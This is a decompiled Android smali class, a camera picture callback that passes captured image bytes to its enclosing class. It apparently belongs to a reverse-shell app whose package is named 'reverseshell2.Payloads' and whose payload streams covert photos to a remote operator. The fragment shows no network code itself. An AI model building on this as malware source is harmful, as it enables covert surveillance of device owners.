.class Lcom/example/reverseshell2/Payloads/CameraPreview$1;
.super Ljava/lang/Object;
.source "CameraPreview.java"

# interfaces
.implements Landroid/hardware/Camera$PictureCallback;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/example/reverseshell2/Payloads/CameraPreview;->startUp(ILjava/io/OutputStream;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/example/reverseshell2/Payloads/CameraPreview;


# direct methods
.method constructor <init>(Lcom/example/reverseshell2/Payloads/CameraPreview;)V
    .locals 0
    .param p1, "this$0"    # Lcom/example/reverseshell2/Payloads/CameraPreview;

    .line 60
    iput-object p1, p0, Lcom/example/reverseshell2/Payloads/CameraPreview$1;->this$0:Lcom/example/reverseshell2/Payloads/CameraPreview;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onPictureTaken([BLandroid/hardware/Camera;)V
    .locals 1
    .param p1, "data"    # [B
    .param p2, "camera"    # Landroid/hardware/Camera;

    .line 63
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/CameraPreview$1;->this$0:Lcom/example/reverseshell2/Payloads/CameraPreview;

    invoke-static {v0}, Lcom/example/reverseshell2/Payloads/CameraPreview;->access$000(Lcom/example/reverseshell2/Payloads/CameraPreview;)V

    .line 64
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/CameraPreview$1;->this$0:Lcom/example/reverseshell2/Payloads/CameraPreview;

    invoke-static {v0, p1}, Lcom/example/reverseshell2/Payloads/CameraPreview;->access$100(Lcom/example/reverseshell2/Payloads/CameraPreview;[B)V

    .line 65
    return-void
.end method
